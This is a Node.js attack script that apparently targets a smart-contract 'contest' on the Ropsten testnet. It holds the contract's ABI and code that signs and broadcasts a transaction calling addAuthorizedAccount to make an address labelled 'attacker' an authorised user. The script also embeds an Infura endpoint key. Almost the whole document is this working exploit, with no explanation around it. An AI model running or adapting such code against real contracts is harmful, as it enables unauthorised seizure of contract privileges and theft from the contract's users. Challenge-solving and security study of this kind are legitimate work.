const Web3 = require('web3');
const Tx = require('ethereumjs-tx');

const contestAddr = "0x7d47a521BF16079d73DA22428536693b94EE46f7"; //1m, 0.01
const attacker = "0x4BC45e632d9aC2b70Ab3D5e7c7d3C92Ed069D658";
const walletAddr = "0xcDc296a1058515E198BeAf5D2e87eC2b620aac03";
const privateKey = new Buffer('privatekey', 'hex');
//contest's abi
const ABIArray = [
	{
		"constant": false,
		"inputs": [],
		"name": "resolve",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": false,
		"inputs": [],
		"name": "initilizeVault",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"name": "observerHistory",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"name": "votes",
		"outputs": [
			{
				"name": "",
				"type": "bool"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [],
		"name": "additionalAuthorizedContract",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": false,
		"inputs": [
			{
				"name": "ob",
				"type": "address"
			}
		],
		"name": "setObserver",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [],
		"name": "withdrawObserver",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [],
		"name": "proposedAAA",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": false,
		"inputs": [],
		"name": "addToReserve",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": true,
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [],
		"name": "lastUpdated",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"name": "authorizedUsers",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": false,
		"inputs": [
			{
				"name": "votePosition",
				"type": "uint256"
			},
			{
				"name": "proposal",
				"type": "address"
			}
		],
		"name": "addAuthorizedAccount",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

//using parity wallet

//https://ropsten.infura.io/nEvK5iGbrxT4uktSVGDT
//http://localhost:8545
const web3 = new Web3(new Web3.providers.HttpProvider('https://ropsten.infura.io/nEvK5iGbrxT4uktSVGDT'));

//setInterval(setObserver, 1000);
authorize();

function authorize(){

    const contractAbi = web3.eth.contract(ABIArray);//contest
    const contestContract = contractAbi.at(contestAddr);//contest
    const addData = contestContract.addAuthorizedAccount.getData(0, attacker);
    const gasPriceHex = web3.toHex(20000000000); //20gwei
    const gasLimitHex = web3.toHex(1000000); //1m
    const nonce = web3.eth.getTransactionCount(walletAddr);
    const nonceHex = web3.toHex(nonce);
    console.log('nonceHex: ' + nonceHex);

    var transaction = {
        nonce: nonceHex,
        gasPrice: gasPriceHex,
        gasLimit: gasLimitHex,
        to: contestAddr,
        from: walletAddr,
        value: '0x00',
        data: addData
    };

    var tx = new Tx(transaction);
    tx.sign(privateKey);

    var stx = tx.serialize();
    web3.eth.sendRawTransaction('0x' + stx.toString('hex'), (err, hash)=>{
        if(err) {
            console.log(err);
            return;
        }

        console.log('transaction tx: '+ hash);
    });
   
}